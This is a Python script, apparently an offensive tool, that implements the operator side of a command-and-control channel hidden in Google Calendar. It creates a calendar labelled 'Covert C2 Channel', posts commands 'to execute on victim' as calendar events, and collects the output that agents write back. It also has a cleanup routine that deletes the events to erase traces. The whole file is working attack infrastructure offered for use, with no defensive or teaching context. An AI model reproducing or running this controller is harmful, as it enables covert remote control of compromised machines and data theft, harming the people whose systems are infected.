#!/usr/bin/env python3

import os
import json
import argparse
from datetime import datetime, timedelta
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build

SCOPES = ['https://www.googleapis.com/auth/calendar']
TOKEN_FILE = 'token_controller.json'
CREDENTIALS_FILE = 'c2cal.json'  

class C2Controller:
    def __init__(self, calendar_name="C2-Operations"):
        self.service = self._authenticate()
        self.calendar_id = self._get_or_create_calendar(calendar_name)
        
    def _authenticate(self):
        """Authenticate with Google Calendar API"""
        creds = None
        if os.path.exists(TOKEN_FILE):
            creds = Credentials.from_authorized_user_file(TOKEN_FILE, SCOPES)
        
        if not creds or not creds.valid:
            if creds and creds.expired and creds.refresh_token:
                creds.refresh(Request())
            else:
                flow = InstalledAppFlow.from_client_secrets_file(CREDENTIALS_FILE, SCOPES)
                creds = flow.run_local_server(port=0)
            
            with open(TOKEN_FILE, 'w') as token:
                token.write(creds.to_json())
        
        return build('calendar', 'v3', credentials=creds)
    
    def _get_or_create_calendar(self, name):
        """Find or create a dedicated calendar for C2"""
        # List all calendars
        calendars = self.service.calendarList().list().execute()
        
        for cal in calendars.get('items', []):
            if cal.get('summary') == name:
                return cal.get('id')
        
        new_cal = {
            'summary': name,
            'description': 'Covert C2 Channel - DO NOT DELETE'
        }
        created = self.service.calendars().insert(body=new_cal).execute()
        print(f"[+] Created new calendar: {created.get('id')}")
        return created.get('id')
    
    def send_command(self, command, agent_id="default"):
        """Create a calendar event with the command"""
        event = {
            'summary': f'CMD: {command[:50]}',  
            'description': f'Agent: {agent_id}\nCommand: {command}\nStatus: PENDING',
            'start': {
                'dateTime': (datetime.utcnow() + timedelta(minutes=1)).isoformat() + 'Z',
                'timeZone': 'UTC',
            },
            'end': {
                'dateTime': (datetime.utcnow() + timedelta(minutes=5)).isoformat() + 'Z',
                'timeZone': 'UTC',
            },
            'colorId': '1',  
        }
        
        result = self.service.events().insert(calendarId=self.calendar_id, body=event).execute()
        print(f"[+] Command sent: {command[:50]}...")
        print(f"[+] Event ID: {result.get('id')}")
        return result.get('id')
    
    def get_results(self, agent_id="default", mark_completed=True):
        """Check for completed tasks and retrieve results"""
        now = datetime.utcnow().isoformat() + 'Z'
        
        events = self.service.events().list(
            calendarId=self.calendar_id,
            timeMin=now,
            maxResults=10,
            singleEvents=True,
            orderBy='startTime'
        ).execute()
        
        results = []
        for event in events.get('items', []):
            desc = event.get('description', '')
            if 'Status: COMPLETED' in desc and agent_id in desc:
                result = desc.split('Output: ')[-1] if 'Output: ' in desc else "No output"
                results.append({
                    'command': event.get('summary', '').replace('CMD: ', ''),
                    'output': result,
                    'event_id': event.get('id')
                })
                
                if mark_completed:
                    updated = event.copy()
                    updated['colorId'] = '3'  
                    self.service.events().update(
                        calendarId=self.calendar_id, 
                        eventId=event.get('id'), 
                        body=updated
                    ).execute()
        
        return results
    
    def cleanup(self):
        """Clean up all events in the calendar"""
        events = self.service.events().list(calendarId=self.calendar_id).execute()
        for event in events.get('items', []):
            self.service.events().delete(calendarId=self.calendar_id, eventId=event['id']).execute()
        print("[+] Cleaned up all events")

def main():
    parser = argparse.ArgumentParser(description='Google Calendar C2 Controller')
    parser.add_argument('--command', '-c', help='Command to execute on victim')
    parser.add_argument('--calendar', default='C2-Operations', help='Calendar name')
    parser.add_argument('--agent', default='default', help='Agent identifier')
    parser.add_argument('--results', action='store_true', help='Fetch results')
    parser.add_argument('--cleanup', action='store_true', help='Delete all events')
    
    args = parser.parse_args()
    c2 = C2Controller(args.calendar)
    
    if args.cleanup:
        c2.cleanup()
    elif args.results:
        results = c2.get_results(args.agent)
        for r in results:
            print(f"\n[+] Command: {r['command']}")
            print(f"[+] Output: {r['output']}")
    elif args.command:
        c2.send_command(args.command, args.agent)
    else:
        print("Use --command or --results")

if __name__ == "__main__":
    main()
